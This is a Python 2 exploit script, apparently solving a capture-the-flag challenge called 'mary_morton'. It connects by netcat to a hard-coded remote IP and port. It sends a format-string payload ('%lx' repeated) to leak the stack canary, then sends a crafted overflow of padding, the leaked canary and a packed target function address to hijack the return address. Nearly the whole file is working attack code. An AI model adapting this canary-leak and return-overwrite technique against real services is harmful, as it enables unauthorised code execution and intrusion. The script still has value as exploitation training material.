from subprocess import Popen, PIPE
import time
import binascii
import struct

def read_header(p):
    print p.stdout.readline()
    print p.stdout.readline()
    print p.stdout.readline()

def read_menu(p):
    print p.stdout.readline()
    print p.stdout.readline()
    print p.stdout.readline()

def canary_sanity_check(fmt_str_resp):
    nums = fmt_str_resp.split(' ')
    if int(nums[ret_addr_index],16) != fmt_str_ret_addr:
        print "we didnt find the ret addr"
        print nums[ret_addr_index]
        print fmt_str_ret_addr
        exit(-1)
    return int(nums[canary_index], 16)


fmt_str_ret_addr = 0x4008B8
fn_addr = 0x004008DA

canary_index = 22
ret_addr_index = 24
buf_len = 0x100

dump_str = " ".join(["%lx"] * 30)
print dump_str
print hex(len(dump_str))

def try_once():
    #p = Popen("./mary_morton", bufsize=0, stdout=PIPE, stdin=PIPE, stderr=PIPE)
    p = Popen(["nc", "146.185.132.36", "19154"], bufsize=0, stdout=PIPE, stdin=PIPE, stderr=PIPE)

    read_header(p)
    read_menu(p)

    p.stdin.write("2\n")
    p.stdin.flush()
    time.sleep(1)
    #print p.stdout.readline()
    ##p.stdin.flush()
    p.stdin.write(dump_str + "\n")
    p.stdin.flush()
    ##time.sleep(1)
    fmt_str_resp = p.stdout.readline()
    print fmt_str_resp
    canary = canary_sanity_check(fmt_str_resp)

    print "canary value: ", hex(canary)

    #canary_no_x = hex(canary)[2::]
    ##canary_no_x = canary_no_x[:-1]
    #print canary_no_x
    #canary_no_x = canary_no_x[:-1] if canary_no_x[-1] == 'L' else canary_no_x
    #while len(canary_no_x) != 16:
    #    canary_no_x = "0" + canary_no_x
    #print canary_no_x
    #print fn_addr

    # the stack buffer is 0x88 bytes
    stk_ovr_msg = "a"*(0x88-1)

    stk_ovr_msg += "a"*1
    bts = struct.pack("Q", canary)
    #bts = binascii.a2b_hex(canary_no_x)
    stk_ovr_msg += bts
    #stk_ovr_msg += binascii.a2b_hex(fn_addr)
    #stk_ovr_msg += binascii.a2b_hex(fn_addr)
    stk_ovr_msg += struct.pack("Q", fn_addr)
    stk_ovr_msg += struct.pack("Q", fn_addr)

    read_menu(p)

    p.stdin.write("1\n")
    p.stdin.flush()
    time.sleep(1)
    print "sending over flow..."
    p.stdin.write(stk_ovr_msg + "\n")
    print p.stdout.readline()
    print p.stdout.readline()
    #p.wait()
    #return p.returncode != 0
    #x = p.stderr.readline()
    #print x
    #if x.find("stack smashing detected") == -1:
    #    print "stack wasnt smashed"
    #    exit(0)

    #print dir(p.stdin)
    #print p.stdin.__class__
    #p.stdin.write("3\n")
    #p.stdin.flush()
    #print p.stdout.readline()

#print p.stdin.write(dump_str + "\n")
#print p.stdout.read(10)

while try_once():
    pass
#try_once()